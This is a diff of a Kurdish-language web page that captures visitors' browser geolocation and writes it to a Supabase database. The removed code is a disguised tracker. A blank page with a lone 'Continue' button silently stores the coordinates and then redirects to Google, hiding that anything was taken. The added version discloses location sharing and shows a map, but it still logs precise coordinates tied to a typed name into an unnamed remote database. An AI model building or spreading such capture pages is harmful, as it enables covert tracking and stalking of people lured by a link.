@@ -3,68 +3,243 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Continue</title>
+  <title>Location Access</title>
+
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
   <style>
     body {
-      background-color: #000000;
+      background-color: #0f172a;
       color: #ffffff;
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
     }
-    button {
-      background-color: #ffffff;
-      color: #000000;
-      border: none;
-      padding: 15px 35px;
-      font-size: 18px;
-      font-weight: bold;
+
+    .card {
+      background: #1e293b;
+      max-width: 400px;
+      width: 100%;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      text-align: center;
+    }
+
+    h2 {
+      margin-top: 0;
+      color: #f8fafc;
+    }
+
+    p {
+      color: #94a3b8;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #334155;
       border-radius: 8px;
+      background: #0f172a;
+      color: #fff;
+      font-size: 15px;
+      text-align: center;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    input[type="text"]:focus {
+      border-color: #3b82f6;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 10px;
+    }
+
+    button {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: bold;
       cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    #allow {
+      background: #2563eb;
+      color: #ffffff;
+    }
+
+    #allow:hover {
+      background: #1d4ed8;
+    }
+
+    #deny {
+      background: #334155;
+      color: #cbd5e1;
+    }
+
+    #deny:hover {
+      background: #475569;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-size: 14px;
+      word-break: break-word;
+    }
+
+    #map {
+      height: 300px;
+      margin-top: 20px;
+      border-radius: 12px;
+      display: none;
+      overflow: hidden;
     }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <button id="btn">بەردەوام بوون</button>
+  <div class="card">
+    <h2>هاوبەشکردنی شوێن</h2>
+    <p>تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.</p>
+
+    <input type="text" id="username" placeholder="ناوەکەت بنووسە..." />
+
+    <div class="btn-group">
+      <button id="allow">بەردەوام بوون</button>
+      <button id="deny">ڕەتکردنەوە</button>
+    </div>
+
+    <div id="result"></div>
+    <div id="map"></div>
+  </div>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <!-- Supabase JS -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
+    // =========================
+    // SUPABASE SETUP
+    // =========================
     const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
     const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
-    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    document.getElementById('btn').addEventListener('click', function() {
-      if (!navigator.geolocation) {
-        alert("Geolocation پشتیوانی ناهێنرێت لەم مۆبایلە/بڕاوسەرە!");
-        window.location.href = "https://www.google.com";
+    // =========================
+    // ELEMENTS
+    // =========================
+    const allowButton = document.getElementById("allow");
+    const denyButton = document.getElementById("deny");
+    const usernameInput = document.getElementById("username");
+    const result = document.getElementById("result");
+    const mapDiv = document.getElementById("map");
+
+    let mapInstance = null;
+
+    // =========================
+    // ALLOW BUTTON ACTION
+    // =========================
+    allowButton.addEventListener("click", function () {
+      const name = usernameInput.value.trim();
+
+      if (!name) {
+        result.innerHTML = "<span style='color: #ef4444;'>❌ تکایە پێشتر ناوەکەت بنووسە!</span>";
         return;
       }
 
+      if (!navigator.geolocation) {
+        result.innerHTML = "<span style='color: #ef4444;'>❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.</span>";
+        return;
+      }
+
+      result.innerHTML = "<span style='color: #3b82f6;'>⏳ داواکاری وەرگرتنی شوێن دەکەین...</span>";
+
       navigator.geolocation.getCurrentPosition(
-        async function(pos) {
-          try {
-            await supabase.from('locations').insert([{
-              name: 'Visitor',
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
-            }]);
-          } catch (e) {
-            console.log(e);
-          } finally {
-            window.location.href = "https://www.google.com";
+        async function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // پێشاندانی نەخشە
+          mapDiv.style.display = "block";
+
+          if (mapInstance) {
+            mapInstance.remove();
+          }
+
+          mapInstance = L.map("map").setView([latitude, longitude], 15);
+
+          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+            attribution: "&copy; OpenStreetMap"
+          }).addTo(mapInstance);
+
+          L.marker([latitude, longitude])
+            .addTo(mapInstance)
+            .bindPopup(`شوێنی: ${name}`)
+            .openPopup();
+
+          // تۆمارکردن لە Supabase
+          const { error } = await supabaseClient
+            .from("locations")
+            .insert([
+              {
+                name: name,
+                latitude: latitude,
+                longitude: longitude
+              }
+            ]);
+
+          if (error) {
+            console.error("Supabase Error:", error);
+            result.innerHTML = "<span style='color: #f59e0b;'>⚠️ شوێنەکە وەرگیرا، بەڵام لە داتابەیس تۆمار نەکرا!</span>";
+            return;
+          }
+
+          result.innerHTML = "<span style='color: #22c55e;'>✅ بە سەرکەوتوویی لە داتابەیس تۆمارکرا!</span>";
+        },
+        function (error) {
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              result.innerHTML = "<span style='color: #ef4444;'>❌ ڕێگەپێدانی شوێن ڕەتکرایەوە.</span>";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              result.innerHTML = "<span style='color: #ef4444;'>❌ زانیاری شوێنەکەت بەردەست نییە.</span>";
+              break;
+            case error.TIMEOUT:
+              result.innerHTML = "<span style='color: #ef4444;'>❌ وەرگرتنی شوێن کاتی بەسەرچوو.</span>";
+              break;
+            default:
+              result.innerHTML = "<span style='color: #ef4444;'>❌ هەڵەیەکی نەزانراو ڕووی دا.</span>";
           }
         },
-        function(err) {
-          alert("هەڵە لە وەرگرتنی شوێن: " + err.message);
-          window.location.href = "https://www.google.com";
-        },
-        { enableHighAccuracy: false, timeout: 10000 }
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
       );
+    });
+
+    // =========================
+    // DENY BUTTON ACTION
+    // =========================
+    denyButton.addEventListener("click", function () {
+      window.location.href = "https://www.google.com";
     });
   </script>
 
